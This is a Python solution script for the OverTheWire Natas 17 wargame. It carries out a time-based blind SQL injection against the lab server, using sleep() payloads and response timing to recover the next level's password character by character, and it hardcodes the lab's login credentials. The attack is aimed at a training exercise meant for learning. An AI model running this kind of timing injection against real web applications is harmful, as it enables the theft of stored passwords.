import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

url = "http://natas17.natas.labs.overthewire.org"
headers = {'content-type':'application/x-www-form-urlencoded'}
filteredchars = ""
passwd = ""
allchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
"""
for char in allchars:
	payload = 'username=natas18%22+and+password+like+binary+%22%25'+char+'%25%22+and+sleep%281%29%3B%23'
	r = requests.post(url,auth=auth,data=payload,headers=headers)
	#print(r.elapsed.seconds)
	if r.elapsed.seconds >= 1:
		filteredchars = filteredchars + char
		print(filteredchars)"""
	
filteredchars = "dghjlmpqsvwxyCDFIKOPR470"

for i in range(32):
	for char in filteredchars:
		payload = 'username=natas18%22+and+password+like+binary+%22'+passwd+char+'%25%22+and+sleep%282%29%3B%23'
		r = requests.post(url,auth=auth,data=payload,headers=headers)
		#print(r.elapsed.seconds)
		if r.elapsed.seconds >= 2:
			passwd = passwd + char
			print(passwd)
			break
